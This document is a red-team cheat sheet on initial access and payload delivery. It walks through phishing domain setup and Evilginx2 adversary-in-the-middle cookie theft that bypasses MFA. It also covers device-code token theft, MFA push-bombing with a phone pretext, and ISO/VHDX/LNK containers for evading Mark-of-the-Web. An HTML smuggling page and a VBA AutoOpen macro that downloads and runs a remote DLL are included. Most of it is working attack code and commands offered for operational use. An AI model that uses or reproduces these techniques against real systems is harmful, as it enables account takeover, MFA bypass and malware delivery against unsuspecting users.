---
title: "Initial Access & Payload Delivery"
description: "Phishing infrastructure, Evilginx2 AiTM, device-code phishing, LNK/ISO/VHDX containers, HTML smuggling, and macro tradecraft"
tags:
  - Red Team
  - Phishing
  - Initial Access
  - Payloads
  - Evilginx
---

# Initial Access & Payload Delivery

---

## 1. Phishing Infrastructure Setup

```bash
# --- Domain preparation (critical: age & categorize the domain FIRST) ---
# 1. Register a lookalike/homoglyph domain 30-60 days before the engagement
# e.g. microsoft-support[.]com, corp-portal[.]net, login-corp[.]io
# 2. Configure SPF, DKIM, DMARC to pass authentication
dig TXT <PHISH_DOMAIN>
dig TXT _dmarc.<PHISH_DOMAIN>
# 3. Categorize the domain (or the email will be blocked)
# Submit to: Symantec SiteReview, BlueCoat, Fortiguard, Trend Micro, OpenDNS
# 4. Test inbox placement: mail-tester.com, GlockApps, MXToolbox
# --- SMTP sending with a valid DKIM key (GoPhish internal SMTP or a VPS) ---
# In GoPhish: Sending Profiles -> Host smtp.<PHISH_DOMAIN>:587, set headers:
# From: "IT Support" <it-support@<PHISH_DOMAIN>>
# Reply-To: it-support@<PHISH_DOMAIN>
# X-Mailer: (remove or set to a common client)
```

---

## 2. Credential Phishing Techniques (2026)

=== " Evilginx2 — Adversary-in-the-Middle (AiTM)"

    ```bash
    # Modern AiTM bypasses 2FA by proxying the REAL login page and stealing the session cookie
    evilginx2 -p /opt/evilginx2/phishlets/

    : config domain <PHISH_DOMAIN>
    : config ipv4 <LHOST>
    : config autocert off
    # Phishlet selection (Microsoft 365 common examples)
    phishlets hostname o365 login.<PHISH_DOMAIN>
    phishlets enable o365
    : lures create o365
    : lures edit 0 redirect_url https://portal.office.com
    : lures get-url 0 # -> https://login.<PHISH_DOMAIN>/<random>
    # Captured session cookies land in: /opt/evilginx2/.evilginx/sessions/
    # Import into Burp / browser to hijack the authenticated session (MFA satisfied!)
    ```

=== " Microsoft Device Code Phishing"

    ```bash
    # 1. Start a device-code phishing campaign (no credential capture needed!)
    # Tools: GraphSpy, TokenTactical, AADInternals, o365devicephish
    # 2. Lure the user to https://microsoft.com/devicelogin with a real code
    # 3. User authenticates (with MFA) -> you receive tokens in the background:
    # - Access token for Graph / Outlook / Teams / OneDrive
    # - Refresh token (valid for 90 days by default!)
    # 4. Persist even after password change via refresh token.
    # Exchange the refresh token for a PRT cookie (Azure AD device ID) to
    # enumerate Azure and gain cloud persistence:
    # roadtx prt -r <REFRESH_TOKEN> -c <PRT_COOKIE>
    ```

=== " MFA Fatigue / Push Bombing"

    ```text
    1. Obtain valid credentials (spray, breach dump, AiTM capture).
    2. Trigger MFA prompts repeatedly (10-50 pushes) via scripted logins.
    3. Pair with a Teams/phone call pretext: "IT Support here, please approve the sign-in
       request we just sent to your phone so we can secure your account."
    4. Success rate is high against push-based MFA (Microsoft Authenticator) when paired
       with urgency and a plausible pretext.
    Mitigation to report: Number Matching (already default in Entra), FIDO2, Conditional Access.
    ```

---

## 3. Payload Container Tradecraft (Mark-of-the-Web Bypass)

The goal: get the user to execute a loader while **preserving trust** and avoiding the "This file came from the Internet" warning where possible.

=== " LNK / ISO / VHDX / IMG Containers"

    ```powershell
    # --- ISO container (the classic MOTW bypass: contents inherit NO Mark-of-the-Web) ---
    # 1. Put your payload (e.g. invoice.exe or a LNK) inside a folder
    # 2. Build an ISO:
    $iso = New-Item -Path "C:\payload\update.iso" -ItemType File
    & "C:\Program Files (x86)\Windows Kits\10\bin\x64\oscdimg.exe" -n -m -o -u2 -udfver102 -l"Docs" "C:\payload\files" "C:\payload\update.iso"
    # 3. Alternative: VHDX / IMG (also bypass MOTW; ISO is more likely flagged now)
    New-VHD -Path C:\payload\update.vhdx -SizeBytes 20MB -Dynamic
    Mount-VHD -Path C:\payload\update.vhdx
    # ... copy files, dismount ...
    # --- LNK payload generator (SharpLNK / Ligolo / PowerShell download cradle) ---
    # LNK targets: C:\Windows\System32\cmd.exe /c powershell -w hidden -enc <BASE64>
    # Add a legitimate-looking icon (e.g. PDF/Word) and a decoy document open
    # Order: open decoy PDF FIRST, then execute loader (user sees nothing suspicious).
    ```

=== " HTML Smuggling"

    ```html
    <!-- Delivers a base64-encoded payload entirely through the browser — no email attachment -->
    <html><body>
    <script>
      function b64ToBlob(b64, type) {
        let bin = atob(b64), arr = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
        return new Blob([arr], {type: type});
      }
      // Base64 of your ISO/ZIP/EXE (grab with: base64 -w0 payload.iso)
      const data = "<BASE64_PAYLOAD_HERE>";
      const blob = b64ToBlob(data, "application/octet-stream");
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "Invoice_Oct2026.iso";
      document.body.appendChild(a); a.click();
    </script>
    </body></html>
    ```

=== " Office Macro Tradecraft (Legacy but still encountered)"

    ```vb
    ' AutoOpen macro that pulls a remote loader while showing a decoy image
    Sub AutoOpen()
        Dim url As String: url = "https://cdn-relay.<DOMAIN>/assets/logo.png"
        Dim xml As Object: Set xml = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xml.Open "GET", url, False
        xml.send
        Dim temp As String: temp = Environ("TEMP") & "\svc.dll"
        Open temp For Binary As #1
        Put #1, , xml.responseBody
        Close #1
        ' Execute via rundll32 (or a LOLBin) to stay one step away from macro detection
        Shell "rundll32.exe " & temp & ",EntryPoint", vbHide
    End Sub
    ```

=== " Other Modern Delivery Vectors"

    ```text
    - OneNote .one files with embedded "click to run" HTA/EXE attachments (still effective)
    - ClickOnce / MSIX / AppInstaller (.appinstaller with a remote URI)
    - Windows Search Connector (.searchconnector-ms) -> points to a malicious WebDAV share
    - .library-ms / .settingcontent-ms (legacy) / .desktop (Linux targets)
    - Google Drive / SharePoint / OneDrive hosted payload with a "shared document" pretext
    - QR-code phishing ("quishing") to bypass email URL scanners -> AiTM page on mobile
    - Teams / Slack / internal-chat file share (bypasses email security entirely!)
    - Supply-chain: compromised NPM/PyPI package, CI/CD token theft, signed installer abuse
    - Valid accounts: purchased credentials, VPN/VDI portal spray, RMM tool deployment abuse
    - Vishing + RMM (AnyDesk/TeamViewer/QuickAssist) — extremely effective against help desks
    ```

!!! tip "Delivery Design Principle"
    Always separate **delivery** from **capability**. The initial file should do nothing but fetch a small stager from a per-campaign redirector. That way, when the payload is burned (flagged/reported), only the delivery host dies — the C2 and long-haul infrastructure survive.